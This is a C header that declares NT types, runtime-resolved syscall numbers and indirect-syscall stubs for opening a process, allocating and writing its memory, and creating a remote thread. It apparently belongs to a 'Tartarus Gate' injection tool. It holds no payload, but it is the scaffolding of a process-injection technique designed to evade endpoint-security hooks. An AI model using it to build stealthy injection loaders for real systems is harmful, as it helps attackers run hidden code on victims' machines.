/*
 * syscalls.h  -  Extern declarations for the globals and stubs
 *                defined in syscalls.asm.
 *
 * The Tartarus Gate resolver (tartarus_gate.c) populates the SSN
 * globals and the gadget pointer at runtime.  The ZwXxx functions
 * are the actual indirect-syscall stubs assembled by ml64.
 */
#pragma once
#include <windows.h>

/* ── NT types needed for the syscall prototypes ─────────────────────────── */

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(s)   ((NTSTATUS)(s) >= 0)
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG            Length;
    HANDLE           RootDirectory;
    UNICODE_STRING  *ObjectName;
    ULONG            Attributes;
    VOID            *SecurityDescriptor;
    VOID            *SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    /* attribute entries follow (not needed for a NULL list) */
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

#define InitObjectAttribs(p) \
    (p)->Length                   = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory            = NULL; \
    (p)->ObjectName               = NULL; \
    (p)->Attributes               = 0;    \
    (p)->SecurityDescriptor       = NULL; \
    (p)->SecurityQualityOfService = NULL

/* ── Globals defined in syscalls.asm (written by the SSN resolver) ──────── */

extern DWORD     g_ssnNtOpenProcess;
extern DWORD     g_ssnNtAllocateVirtualMemory;
extern DWORD     g_ssnNtWriteVirtualMemory;
extern DWORD     g_ssnNtCreateThreadEx;
extern ULONG_PTR g_pGadget;

/* ── Syscall stubs defined in syscalls.asm ──────────────────────────────── */

NTSTATUS ZwOpenProcess(
    PHANDLE             ProcessHandle,
    ACCESS_MASK         DesiredAccess,
    OBJECT_ATTRIBUTES  *ObjectAttributes,
    CLIENT_ID          *ClientId
);

NTSTATUS ZwAllocateVirtualMemory(
    HANDLE   ProcessHandle,
    PVOID   *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T  RegionSize,
    ULONG    AllocationType,
    ULONG    Protect
);

NTSTATUS ZwWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

/*
 * NtCreateThreadEx - 11 parameters, last 7 on the stack.
 * We pass NULL for ObjectAttributes and AttributeList.
 */
NTSTATUS ZwCreateThreadEx(
    PHANDLE             ThreadHandle,
    ACCESS_MASK         DesiredAccess,
    OBJECT_ATTRIBUTES  *ObjectAttributes,
    HANDLE              ProcessHandle,
    PVOID               StartRoutine,
    PVOID               Argument,
    ULONG               CreateFlags,
    SIZE_T              ZeroBits,
    SIZE_T              StackSize,
    SIZE_T              MaximumStackSize,
    PPS_ATTRIBUTE_LIST  AttributeList
);
